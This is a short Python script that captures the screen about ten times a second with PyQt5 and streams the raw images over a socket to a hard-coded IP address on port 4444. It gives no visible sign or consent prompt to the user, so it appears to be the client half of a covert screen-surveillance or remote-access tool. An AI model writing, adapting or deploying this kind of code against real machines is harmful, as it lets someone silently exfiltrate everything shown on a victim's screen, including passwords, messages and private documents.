import sys
from PyQt5.QtWidgets import QApplication
from PyQt5.QtGui import QScreen
from socket import socket, AF_INET, SOCK_STREAM
import struct
import time

def send_screenshot(connection):
    while True:
        # Capture the screen
        screen = QApplication.primaryScreen()
        screenshot = screen.grabWindow(0).toImage()

        # Convert the screenshot to bytes
        buffer = screenshot.bits().asstring(screenshot.byteCount())

        # Send the length of the data first
        data_len = len(buffer)
        connection.sendall(struct.pack('>I', data_len))

        # Send the image data in chunks to ensure complete transmission
        connection.sendall(buffer)

        # Wait before capturing the next screenshot
        time.sleep(0.1)  # Adjust the delay as needed

if __name__ == '__main__':
    app = QApplication(sys.argv)

    ip = '172.26.136.52'  # Replace with the server IP address
    port = 4444

    # Create a socket object
    connection = socket(AF_INET, SOCK_STREAM)
    connection.connect((ip, port))

    # Send screenshots continuously
    send_screenshot(connection)
    
    connection.close()
